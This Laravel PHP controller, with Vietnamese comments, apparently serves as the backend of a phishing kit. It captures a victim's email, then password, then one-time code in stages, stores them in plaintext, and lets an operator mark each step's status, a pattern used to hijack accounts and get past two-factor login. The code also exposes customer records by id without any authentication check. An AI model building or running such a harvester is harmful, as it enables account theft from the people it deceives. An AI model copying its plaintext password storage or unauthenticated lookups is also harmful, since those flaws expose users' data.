<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Customer;
use Illuminate\Support\Facades\Log;

class CustomerController extends Controller
{
    // email

    public function login () {
        return view('customers.login');
    }

    public function show (Request $request) {
        $customer = Customer::find($request->id);
        $res = [];
        if ($customer) {
            $res = [
                'success' => true,
                'data' => $customer,
            ];
        }
        return $res;
    }

    public function saveEmail(Request $request)
    {
        try {
            // Kiểm tra dữ liệu đầu vào
                // Tạo mới một bản ghi Customer và lưu vào cơ sở dữ liệu
                $customer = new Customer;
                $customer->email = $request->email;
                $customer->save();
                return response()->json([
                    'success' => true,
                    'data' => $customer,
                ]);
        } catch (\Exception $e) {
           
        }
    }


    public function change_status_email (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_email = $request->status;
        $customer->save();
        return redirect()->route('admin.index')->with('success', 'Cập nhật trạng thái email thành công cho '.$customer->email);
    }

    public function change_status_email_bar (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_email = 3;
        $customer->save();
        return response()->json([
            'success' => true,
            'data' => $customer,
        ]);
    }

    // password

    public function get_view_password () {
        return view('customers.password');
    }

    public function savePassword (Request $request) {
        try {
            // Kiểm tra dữ liệu đầu vào
                // Tạo mới một bản ghi Customer và lưu vào cơ sở dữ liệu
                $customer = Customer::find($request->id);
                $customer->password = $request->password;
                $customer->save();
                return response()->json([
                    'success' => true,
                    'data' => $customer,
                ]);
        } catch (\Exception $e) {
            Log::error('Error saving OTP: ' . $e->getMessage());
        }
    }


    public function change_status_password (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_password = $request->status;
        $customer->save();
        return redirect()->route('admin.index')->with('success', 'Cập nhật trạng thái mật khẩu thành công cho '.$customer->email);
    }

    public function change_status_password_bar (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_password = 3;
        $customer->save();
        return response()->json([
            'success' => true,
            'data' => $customer,
        ]);
    }

    // otp

    public function get_view_otp () {
        return view('customers.otp');
    }

    public function saveOtp (Request $request) {
        try {
            // Kiểm tra dữ liệu đầu vào
                // Tạo mới một bản ghi Customer và lưu vào cơ sở dữ liệu
                $customer = Customer::find($request->id);
                $customer->code_otp = $request->otp;
                $customer->save();
                return response()->json([
                    'success' => true,
                    'data' => $customer,
                ]);
        } catch (\Exception $e) {
            Log::error('Error saving OTP: ' . $e->getMessage());
        }
    }

    public function change_status_otp (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_otp = $request->status;
        $customer->save();
        return redirect()->route('admin.index')->with('success', 'Cập nhật trạng thái OTP thành công cho '.$customer->email);
    }

    public function change_status_otp_bar (Request $request) {
        $customer = Customer::find($request->id);
        $customer->status_otp = 3;
        $customer->save();
        return response()->json([
            'success' => true,
            'data' => $customer,
        ]);
    }
}
